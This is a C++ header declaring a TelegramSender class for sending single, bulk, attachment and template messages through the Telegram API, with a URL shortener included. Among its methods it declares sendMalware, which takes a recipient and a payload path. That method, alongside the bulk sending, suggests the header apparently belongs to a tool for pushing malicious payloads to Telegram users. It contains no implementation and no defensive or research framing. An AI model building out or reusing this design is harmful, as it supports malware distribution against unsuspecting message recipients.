#ifndef TELEGRAMSENDER_H
#define TELEGRAMSENDER_H

#include <string>
#include <vector>
#include <unordered_map>
#include <memory>
#include "TemplateLoader.h"
#include "Logger.h"
#include "MCreator.h"
#include "URLShortener.h" 

class TelegramSender {
public:
    TelegramSender(const std::string& token);
    void sendMessage(const std::string &recipient, const std::string &message);
    void sendBulkMessages(const std::vector<std::string> &recipients, const std::string &message);
    void sendMessageWithAttachment(const std::string &recipient, const std::string &message, const std::string &attachmentPath);
    bool sendTemplateMessage(const std::string &recipient, const std::string &templateName, const std::unordered_map<std::string, std::string> &params);
    void sendMalware(const std::string &recipient, const std::string &payloadPath);
    void setTemplateLoader(const std::shared_ptr<TemplateLoader>& loader);

private:
    std::string token;
    std::shared_ptr<TemplateLoader> templateLoader;

    std::string prepareMessage(const std::string &message);
    void sendHTTPRequest(const std::string &url, const std::map<std::string, std::string>& fields);
    void logTelegramSending(const std::string &recipient, const std::string &message);
    void handleApiResponse(const std::string &response);
    bool retryOnFailure(const std::string &recipient, const std::string &message, int retries = 3);
};

#endif // TELEGRAMSENDER_H






